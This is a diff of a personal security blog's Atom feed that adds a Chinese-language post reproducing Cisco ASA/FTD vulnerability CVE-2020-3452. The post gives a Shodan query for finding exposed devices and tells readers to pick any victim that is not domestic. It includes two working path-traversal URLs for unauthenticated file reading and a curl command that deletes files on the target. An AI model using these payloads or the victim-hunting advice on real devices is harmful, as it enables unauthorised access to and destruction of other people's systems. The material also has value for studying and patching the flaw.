@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://m0sway.github.io</id>
     <title>m0sway</title>
-    <updated>2020-07-27T08:22:24.284Z</updated>
+    <updated>2020-07-27T12:03:56.304Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://m0sway.github.io"/>
     <link rel="self" href="https://m0sway.github.io/atom.xml"/>
@@ -10,6 +10,46 @@
     <logo>https://m0sway.github.io/images/avatar.png</logo>
     <icon>https://m0sway.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, m0sway</rights>
+    <entry>
+        <title type="html"><![CDATA[Cisco CVE-2020-3452 漏洞复现]]></title>
+        <id>https://m0sway.github.io/post/cisco-cve-2020-3452-lou-dong-fu-xian/</id>
+        <link href="https://m0sway.github.io/post/cisco-cve-2020-3452-lou-dong-fu-xian/">
+        </link>
+        <updated>2020-07-27T11:35:29.000Z</updated>
+        <content type="html"><![CDATA[<p>##简介<br>
+Cisco Firepower Threat Defense（FTD）和Cisco Adaptive Security Appliances Software（ASA Software）都是美国思科（Cisco）公司的产品。Cisco Firepower Threat Defense是一套提供下一代防火墙服务的统一软件。Cisco Adaptive Security Appliances Software是一套防火墙和网络安全平台。该平台提供了对数据和网络资源的高度安全的访问等功能。</p>
+<p>##0x01 漏洞描述<br>
+Cisco ASA Software和FTD Software中存在输入验证错误漏洞，该漏洞源于受影响设备没有正确验证HTTP请求中的URL。远程攻击者可通过将包含目录遍历字符序列的特制HTTP请求发送到受影响的设备利用该漏洞在目标设备上查看Web服务文件系统内的任意文件。</p>
+<p>##0x02 开搞开搞<br>
+老规矩，先去shodan上任意寻找一个受害者(别是国内的就行)</p>
+<pre><code>    shodan搜索：
+    Set-Cookie: webvpn;
+</code></pre>
+<p>POC如下</p>
+<pre><code>    POC1：
+    https：// &lt;domain&gt; /+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../
+
+    POC2:
+    https://&lt;domain&gt;/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=%2bCSCOE%2b/portal_inc.lua
+</code></pre>
+<p>先来看一下登录界面的样子(要记得哦，后面会有用的)：<br>
+<img src="https://m0sway.github.io/post-images/1595850672829.jpg" alt="" loading="lazy"></p>
+<p>给出的这两个POC允许未经身份验证在Cisco ASA和Cisco Firepower中读取任意文件，但无法读取OS文件。<br>
+如下图所示：<br>
+<img src="https://m0sway.github.io/post-images/1595850814218.jpg" alt="" loading="lazy"><br>
+其他还有什么可以读的文件可以自己尝试找找。</p>
+<p>接着还发现，通过这个文件遍历漏洞还可以扩展出一个任意文件删除的漏洞。</p>
+<p>POC<br>
+<code>curl -k -H &quot;Cookie: token=..//+CSCOU+/csco_logo.gif&quot; https://target/+CSCOE+/session_password.html</code></p>
+<p>这里就用Cisco的logo来演示，右击logo图片找到图片地址。</p>
+<p>可以通过curl命令，也可以通过bp来执行删除操作，如下图所示：<br>
+<img src="https://m0sway.github.io/post-images/1595851198560.jpg" alt="" loading="lazy"><br>
+<img src="https://m0sway.github.io/post-images/1595851211367.jpg" alt="" loading="lazy"></p>
+<p>emmm 大概就是这么一个鸡肋的漏洞(就和CatGhost漏洞一样，单独一个漏洞没太大的利用价值)</p>
+<p>##POC<br>
+这个漏洞需要POC？</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[信息收集系统篇]]></title>
         <id>https://m0sway.github.io/post/xin-xi-shou-ji-zong-jie-pian-bu-ding-qi-geng-xin/</id>
